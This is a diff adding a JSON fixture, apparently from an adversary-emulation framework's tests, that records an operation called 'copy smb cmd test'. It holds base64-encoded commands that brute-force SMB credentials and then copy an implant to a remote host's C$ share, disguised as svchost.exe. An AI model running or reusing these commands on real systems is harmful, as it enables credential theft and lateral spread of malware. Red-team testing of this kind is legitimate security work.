@@ -1,0 +1,265 @@
+{
+    "name": "copy smb cmd test",
+    "id": 6,
+    "host_group": [
+        {
+            "id": 2,
+            "paw": "WIN-532ILFRKI44$WIN-532ILFRKI44\\zathras",
+            "last_seen": "2020-01-25 20:50:04",
+            "architecture": "amd64",
+            "platform": "windows",
+            "server": "http://192.168.100.142:8888",
+            "host_group": "my_group",
+            "location": "C:\\Users\\Public\\sandcat.exe",
+            "pid": 3768,
+            "ppid": 3724,
+            "trusted": 1,
+            "last_trusted_seen": "2020-01-25 20:50:04",
+            "sleep_min": 10,
+            "sleep_max": 10,
+            "executors": [
+                {
+                    "executor": "cmd",
+                    "preferred": 1
+                },
+                {
+                    "executor": "psh",
+                    "preferred": 0
+                },
+                {
+                    "executor": "shellcode_amd64",
+                    "preferred": 0
+                }
+            ]
+        }
+    ],
+    "start": "2020-01-25 20:50:01",
+    "facts": [
+        {
+            "id": 1,
+            "property": "file.sensitive.extension",
+            "value": "txt",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "1",
+            "link_id": null
+        },
+        {
+            "id": 2,
+            "property": "file.sensitive.extension",
+            "value": "yml",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "1",
+            "link_id": null
+        },
+        {
+            "id": 3,
+            "property": "host.service.modifiable",
+            "value": "fax",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "1",
+            "link_id": null
+        },
+        {
+            "id": 4,
+            "property": "target.org.name",
+            "value": "mitre.org",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "1",
+            "link_id": null
+        },
+        {
+            "id": 9,
+            "property": "remote.host.ip",
+            "value": "192.168.100.143",
+            "score": 9,
+            "set_id": 0,
+            "source_id": "1",
+            "link_id": null
+        },
+        {
+            "id": 10,
+            "property": "remote.host.socket",
+            "value": "192.168.100.143:445",
+            "score": 9,
+            "set_id": 0,
+            "source_id": "1",
+            "link_id": null
+        },
+        {
+            "id": 11,
+            "property": "remote.service.smb",
+            "value": "192.168.100.143:445",
+            "score": 9,
+            "set_id": 0,
+            "source_id": "1",
+            "link_id": null
+        }
+    ],
+    "finish": "2020-01-25 20:50:04",
+    "planner": {
+        "id": 1,
+        "name": "sequential",
+        "module": "plugins.stockpile.app.sequential",
+        "params": {}
+    },
+    "adversary": {
+        "id": 19,
+        "adversary_id": "63784b2d-cc61-45ab-a53f-428cffdf3f67",
+        "name": "copy sandcat smb",
+        "description": "copies sandcat over smb",
+        "phases": {
+            "1": [
+                {
+                    "id": 85,
+                    "ability_id": "405d7d46-cdb9-4c7f-97e9-7feba3bea2f6",
+                    "tactic": "credential-access",
+                    "technique_name": "Brute Force",
+                    "technique_id": "T1110",
+                    "name": "Brute Force SMB",
+                    "test": "cHl0aG9uMyBicnV0ZUZvcmNlLnB5IC0tdGFyZ2V0ICN7cmVtb3RlLnNlcnZpY2Uuc21ifQ==",
+                    "description": "Use dropped file to brute force credentials",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [
+                        {
+                            "ability": 85,
+                            "name": "line",
+                            "property": "remote.host.credentials",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 85,
+                            "payload": "bruteForce.py"
+                        }
+                    ],
+                    "adversary_map_id": 83
+                },
+                {
+                    "id": 86,
+                    "ability_id": "405d7d46-cdb9-4c7f-97e9-7feba3bea2f6",
+                    "tactic": "credential-access",
+                    "technique_name": "Brute Force",
+                    "technique_id": "T1110",
+                    "name": "Brute Force SMB",
+                    "test": "cHl0aG9uMyBicnV0ZUZvcmNlLnB5IC0tdGFyZ2V0ICN7cmVtb3RlLnNlcnZpY2Uuc21ifQ==",
+                    "description": "Use dropped file to brute force credentials",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 86,
+                            "name": "line",
+                            "property": "remote.host.credentials",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 86,
+                            "payload": "bruteForce.py"
+                        }
+                    ],
+                    "adversary_map_id": 83
+                },
+                {
+                    "id": 87,
+                    "ability_id": "405d7d46-cdb9-4c7f-97e9-7feba3bea2f6",
+                    "tactic": "credential-access",
+                    "technique_name": "Brute Force",
+                    "technique_id": "T1110",
+                    "name": "Brute Force SMB",
+                    "test": "cHl0aG9uMyBicnV0ZUZvcmNlLnB5IC0tdGFyZ2V0ICN7cmVtb3RlLnNlcnZpY2Uuc21ifQ==",
+                    "description": "Use dropped file to brute force credentials",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 87,
+                            "name": "line",
+                            "property": "remote.host.credentials",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 87,
+                            "payload": "bruteForce.py"
+                        }
+                    ],
+                    "adversary_map_id": 83
+                }
+            ],
+            "2": [
+                {
+                    "id": 204,
+                    "ability_id": "c5e75d70-09ae-469f-8717-621a1b7ef946",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Remote File Copy",
+                    "technique_id": "T1105",
+                    "name": "Copy 54ndc47 (SMB)",
+                    "test": "Zm9yIC9mICJ0b2tlbnM9MS00IGRlbGltcz06ICIgJUEgaW4gKCIje3JlbW90ZS5ob3N0LmNyZWRlbnRpYWxzfSIpIGRvIEAoc2V0IGlwPSVBICYmIHNldCBwb3J0PSVCICYmIHNldCB1c2VyPSVDICYmIHNldCBwdz0lRCkKbmV0IHVzZSBcXCVpcCVcYyQgL3VzZXI6JXVzZXIlICVwdyUgL3BlcnNpc3RlbnQ6bm8gJgpjb3B5IC9CIC9ZIHNhbmRjYXQuZ28td2luZG93cyBcXCVpcCVcYyRcVXNlcnNcUHViaWNcc3ZjaG9zdC5leGU=",
+                    "description": "Copy 54ndc47 to remote host (SMB)",
+                    "cleanup": "ZXJhc2UgXFwje3JlbW90ZS5ob3N0LmlwfVxjJFxVc2Vyc1xQdWJpY1xzdmNob3N0LmV4ZSAvUSAvRiAmCm5ldCB1c2UgXFwje3JlbW90ZS5ob3N0LmlwfVxjJCAvZGVsZXRl",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 204,
+                            "payload": "sandcat.go-windows"
+                        }
+                    ],
+                    "adversary_map_id": 84
+                },
+                {
+                    "id": 203,
+                    "ability_id": "c5e75d70-09ae-469f-8717-621a1b7ef946",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Remote File Copy",
+                    "technique_id": "T1105",
+                    "name": "Copy 54ndc47 (SMB)",
+                    "test": "JHNwbGl0ID0gIiN7cmVtb3RlLmhvc3QuY3JlZGVudGlhbHN9IjsKJHVzZXJuYW1lID0gJHNwbGl0WzJdOwokcGFzc3dvcmQgPSAkc3BsaXRbM10KJHNlY3N0ciA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5TZWN1cml0eS5TZWN1cmVTdHJpbmc7CiRwYXNzd29yZC5Ub0NoYXJBcnJheSgpIHwgRm9yRWFjaC1PYmplY3QgeyRzZWNzdHIuQXBwZW5kQ2hhcigkXyl9OwokY3JlZCA9IE5ldy1PYmplY3QgLVR5cGVuYW1lIFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsIC1Bcmd1bWVudGxpc3QgJHVzZXJuYW1lLCAkc2Vjc3RyOwokcGF0aCA9ICRlbnY6VVNFUlBST0ZJTEUrIlxzYW5kY2F0LmdvLXdpbmRvd3MiOwokZHJpdmUgPSAiI3tyZW1vdGUuaG9zdC5pcH0iLnJlcGxhY2UoIi4iLCJfIik7Ck5ldy1QU0RyaXZlIC1OYW1lICRkcml2ZSAtUFNQcm92aWRlciBGaWxlU3lzdGVtIC1Sb290ICJcXCRzcGxpdFswXVxDJCIgLUNyZWRlbnRpYWwgJGNyZWQ7CkNvcHktSXRlbSAtUGF0aCAkcGF0aCAtRGVzdGluYXRpb24gJGRyaXZlIjpcVXNlcnNcUHVibGljXHN2Y2hvc3QuZXhlIjs=",
+                    "description": "Copy 54ndc47 to remote host (SMB)",
+                    "cleanup": "JGRyaXZlID0gIiN7cmVtb3RlLmhvc3QuaXB9Ii5yZXBsYWNlKCIuIiwiXyIpOwpSZW1vdmUtSXRlbSAtUGF0aCAkZHJpdmUiOlxVc2Vyc1xQdWJsaWNcc3ZjaG9zdC5leGUiIC1Gb3JjZTsKUmVtb3ZlLVBTRHJpdmUgLU5hbWUgJGRyaXZlOw==",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 203,
+                            "payload": "sandcat.go-windows"
+                        }
+                    ],
+                    "adversary_map_id": 84
+                }
+            ]
+        }
+    },
+    "jitter": "4/8",
+    "steps": [
+        {
+            "ability_id": "405d7d46-cdb9-4c7f-97e9-7feba3bea2f6",
+            "paw": "WIN-532ILFRKI44$WIN-532ILFRKI44\\zathras",
+            "command": "python3 bruteForce.py --target 192.168.100.143:445",
+            "delegated": "2020-01-25 20:50:04.350529",
+            "run": "2020-01-25 20:50:04",
+            "status": 1,
+            "description": "Use dropped file to brute force credentials",
+            "name": "Brute Force SMB",
+            "attack": {
+                "tactic": "credential-access",
+                "technique_name": "Brute Force",
+                "technique_id": "T1110"
+            }
+        }
+    ]
+}
